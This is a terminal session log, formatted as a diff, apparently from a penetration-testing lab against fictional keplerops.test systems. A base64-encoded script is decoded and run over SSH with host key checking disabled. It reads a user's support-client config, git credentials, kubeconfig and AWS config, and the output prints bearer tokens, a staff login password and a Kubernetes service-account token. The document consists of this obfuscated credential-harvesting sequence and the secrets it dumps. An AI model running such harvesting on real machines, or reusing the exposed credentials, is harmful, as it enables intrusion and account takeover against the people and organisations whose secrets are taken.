@@ -1,0 +1,128 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/r2.sh <<'B64EOF'
+> c2V0ICtlClM9InNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyByb3dhbi1kZXYiCnJ1bigpeyBlY2hvICI9PT09PSAkMSA9PT09PSI7ICRTICIkMSIgMj4mMTsgZWNobzsgfQpydW4gJ2xzIC1sYVIgLmNvbmZpZy9maWVsZGxpbmsgLmNvbmZpZyAyPiYxIHwgaGVhZCAtODA7IGVjaG8gIj09PSBTVVBQT1JUIENMSUVOVCA9PT0iOyBmb3IgZiBpbiAuY29uZmlnL2ZpZWxkbGluay8qOyBkbyBlY2hvICItLS0gJGYiOyBjYXQgIiRmIjsgZWNobzsgZG9uZScKcnVuICdscyAtbGEgLmxvY2FsL3NoYXJlL2tlcGxlcm9wczsgZWNobyA9PT07IGNhdCAuY29uZmlnL2Nocm9taXVtL0RlZmF1bHQvUHJlZmVyZW5jZXM7IGVjaG87IGVjaG8gIj09PSBoaXN0IGRpcnMgPT09IjsgZmluZCAuY29uZmlnIC10eXBlIGYgfCBoZWFkIC00MCcKcnVuICdscyAtbGEgLmNvbmZpZy9maWVsZGxpbms7IHN0YXQgLmNvbmZpZy9maWVsZGxpbmsvc3VwcG9ydC1jbGllbnQuanNvbiAyPi9kZXYvbnVsbCcKcnVuICdjYXQgLmNvbmZpZy9naXQvY3JlZGVudGlhbHM7IGVjaG8gPT09OyBjYXQgLmt1YmUvY29uZmlnIHwgaGVhZCAtNjA7IGVjaG8gPT09OyBjYXQgLmF3cy9jb25maWcnCg==
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/r2.sh; bash /tmp/r2.sh; echo DONEMARK_1795194614508$((6*7))
+===== ls -laR .config/fieldlink .config 2>&1 | head -80; echo "=== SUPPORT CLIENT ==="; for f in .config/fieldlink/*; do echo "--- $f"; cat "$f"; echo; done =====
+.config:
+total 20
+drwx------ 5 rowan rowan 4096 Nov 19 07:11 .
+drwx------ 9 rowan rowan 4096 Nov 19 18:48 ..
+drwx------ 3 rowan rowan 4096 Nov 19 07:11 chromium
+drwx------ 2 rowan rowan 4096 Nov 19 07:11 fieldlink
+drwx------ 2 rowan rowan 4096 Nov 19 13:46 git
+
+.config/chromium:
+total 12
+drwx------ 3 rowan rowan 4096 Nov 19 07:11 .
+drwx------ 5 rowan rowan 4096 Nov 19 07:11 ..
+drwx------ 2 rowan rowan 4096 Nov 19 07:11 Default
+
+.config/chromium/Default:
+total 52
+drwx------ 2 rowan rowan  4096 Nov 19 07:11 .
+drwx------ 3 rowan rowan  4096 Nov 19 07:11 ..
+-rw------- 1 rowan rowan 20480 Nov 19 07:11 Cookies
+-rw------- 1 rowan rowan 20480 Sep 18 11:00 History
+-rw------- 1 rowan rowan   202 Sep 18 11:00 Preferences
+
+.config/fieldlink:
+total 12
+drwx------ 2 rowan rowan 4096 Nov 19 07:11 .
+drwx------ 5 rowan rowan 4096 Nov 19 07:11 ..
+-rw------- 1 rowan rowan  459 Nov 19 07:11 support-client.json
+
+.config/git:
+total 12
+drwx------ 2 rowan rowan 4096 Nov 19 13:46 .
+drwx------ 5 rowan rowan 4096 Nov 19 07:11 ..
+-rw------- 1 rowan rowan   86 Nov 19 13:46 credentials
+
+.config/fieldlink:
+total 12
+drwx------ 2 rowan rowan 4096 Nov 19 07:11 .
+drwx------ 5 rowan rowan 4096 Nov 19 07:11 ..
+-rw------- 1 rowan rowan  459 Nov 19 07:11 support-client.json
+=== SUPPORT CLIENT ===
+--- .config/fieldlink/support-client.json
+{"service_url": "https://support.keplerops.test:8443", "principal": "rowan.ito", "authorization": "Bearer fk_support_rowan_2fxtXNkUjKMbcvPBlAot0Jp0vVNppL9b", "ca_file": "/home/rowan/.local/share/keplerops/ca.crt", "retained_staff_login": {"url": "https://support.keplerops.test/scp/", "username": "maya.ranscombe", "password": "sWQa31085FTQekZhHTxUyf_9E1marq0ur8WNCKmTtnk", "note": "Retained support-desk staff login left in the shared workstation profile."}}
+
+===== ls -la .local/share/keplerops; echo ===; cat .config/chromium/Default/Preferences; echo; echo "=== hist dirs ==="; find .config -type f | head -40 =====
+total 16
+drwxr-xr-x 2 rowan rowan 4096 Nov 19 07:11 .
+drwxr-xr-x 3 rowan rowan 4096 Nov 19 07:11 ..
+-r--r--r-- 1 root  root  1505 Nov 19 07:11 ca.crt
+-rw-r--r-- 1 rowan rowan    0 Nov 19 03:07 connector-archive-2026-09-18
+-r--r--r-- 1 root  root   704 Nov 19 07:11 enrollment-ca.crt
+-rw-r--r-- 1 rowan rowan    0 Nov 19 03:07 policy-compiler-2026-09-18
+-rw-r--r-- 1 rowan rowan    0 Nov 19 03:07 registry-foundation-2026-09-18
+-rw-r--r-- 1 rowan rowan    0 Nov 19 03:07 release-lineage-2026-09-18
+===
+{
+  "browser": {
+    "check_default_browser": false
+  },
+  "profile": {
+    "exited_cleanly": true,
+    "exit_type": "Normal",
+    "name": "Rowan"
+  },
+  "session": {
+    "restore_on_startup": 1
+  }
+}
+
+
+=== hist dirs ===
+.config/chromium/Default/Cookies
+.config/chromium/Default/Preferences
+.config/chromium/Default/History
+.config/git/credentials
+.config/fieldlink/support-client.json
+
+===== ls -la .config/fieldlink; stat .config/fieldlink/support-client.json 2>/dev/null =====
+total 12
+drwx------ 2 rowan rowan 4096 Nov 19 07:11 .
+drwx------ 5 rowan rowan 4096 Nov 19 07:11 ..
+-rw------- 1 rowan rowan  459 Nov 19 07:11 support-client.json
+  File: .config/fieldlink/support-client.json
+  Size: 459       	Blocks: 8          IO Block: 4096   regular file
+Device: 8,1	Inode: 283147      Links: 1
+Access: (0600/-rw-------)  Uid: ( 2000/   rowan)   Gid: ( 2000/   rowan)
+Access: 2026-11-20 17:14:34.851476666 +0000
+Modify: 2026-11-19 07:11:58.681492963 +0000
+Change: 2026-11-19 07:11:58.681492963 +0000
+ Birth: 2026-11-19 07:11:58.681492963 +0000
+
+===== cat .config/git/credentials; echo ===; cat .kube/config | head -60; echo ===; cat .aws/config =====
+https://rowan.ito:fk_developer_yUWTKSqrc16y3K5_5DfQ7qacft9b-9xo@source.keplerops.test
+===
+apiVersion: v1
+kind: Config
+clusters:
+  - name: fieldlink
+    cluster:
+      server: https://cloud-api.keplerops.test:6443
+      certificate-authority-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUJkekNDQVIyZ0F3SUJBZ0lCQURBS0JnZ3Foa2pPUFFRREFqQWpNU0V3SHdZRFZRUUREQmhyTTNNdGMyVnkKZG1WeUxXTmhRREUzT1RVd056SXdNVEV3SGhjTk1qWXhNVEU1TURZd05qVXhXaGNOTXpZeE1URTJNRFl3TmpVeApXakFqTVNFd0h3WURWUVFEREJock0zTXRjMlZ5ZG1WeUxXTmhRREUzT1RVd056SXdNVEV3V1RBVEJnY3Foa2pPClBRSUJCZ2dxaGtqT1BRTUJCd05DQUFTOWVzRThNaGJmazFGTzJqdGVwUUhyTzRnaUJlWEhuS2VKQ1g1R01mcFYKU3JQOXNzVnRXZCtKRmtTL2twR3RPRTlUNy9FbmNjd2J0NmpjMDJnRXUycnBvMEl3UURBT0JnTlZIUThCQWY4RQpCQU1DQXFRd0R3WURWUjBUQVFIL0JBVXdBd0VCL3pBZEJnTlZIUTRFRmdRVWdEeHBSRHdZM2ovbWc2UkQ1R0gzCnFzODlWNk13Q2dZSUtvWkl6ajBFQXdJRFNBQXdSUUlnQ3l0UHlIck50dlNRVWV4VXNkb1VOQjZtdGVoWlo0REcKcmppeGtJQ1Q2V3NDSVFEb1Frc1BDVFBzdjgxNnpRcUVKYjNWYUFGaFltNEtING5pbXprSXd2aFBmQT09Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K
+users:
+  - name: rowan-workspace
+    user:
+      token: eyJhbGciOiJSUzI1NiIsImtpZCI6ImlaekpKU0hrTDFqaEtzVk1yQXhCTG9QaVc0ZUlaNDVHclhrcTVWZUxmVXcifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzk3NjY0MDQ0LCJpYXQiOjE3OTUwNzIwNDQsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiZjFhNTNhNGEtZmIxNi00ZDJlLWI2MWItNjMyNzYzNWYzYjAzIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJmaWVsZGxpbmsiLCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoicm93YW4td29ya3NwYWNlIiwidWlkIjoiY2FiNzY1MDUtNmNjMS00OTNkLTliNjgtMmE0NzRiMWQzMjA0In19LCJuYmYiOjE3OTUwNzIwNDQsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpmaWVsZGxpbms6cm93YW4td29ya3NwYWNlIn0.Dc8hMkZDkZnjZ0PgPnZp7qS9xJ3_uO_38_LJM1-4z5rlkHBQMD92S9jZ7zStGg5G8m93Lg0yQ1v3OSA6kCkAJyVOOWdxSgc8Z2p8ptxNPjiC3oiFHwRpInnoF-XG8DPUnQpcojvE7XdPWzamY3tWtMSJZWuvPwvQwVj1xFPWRmlQIhol8TvNBUG85sg0R4FeYUqs8BY3sOC79NskKMtAxwQ9O8Am9kl1eSPiXhqAQMQDA6TduozxwOjBdn34DIPRB_PX6sVKniYZoG9SpZTpYQ7_UKYsg8cjvxQ_FWaM4OOUdU5BzIt-nskpp_5cGFf0XmVESdw-GzstqP9Cyeu2wg
+contexts:
+  - name: fieldlink
+    context:
+      cluster: fieldlink
+      user: rowan-workspace
+      namespace: fieldlink
+current-context: fieldlink
+===
+[default]
+region=us-east-1
+ca_bundle=/home/rowan/.local/share/keplerops/ca.crt
+s3=
+    addressing_style=path
+
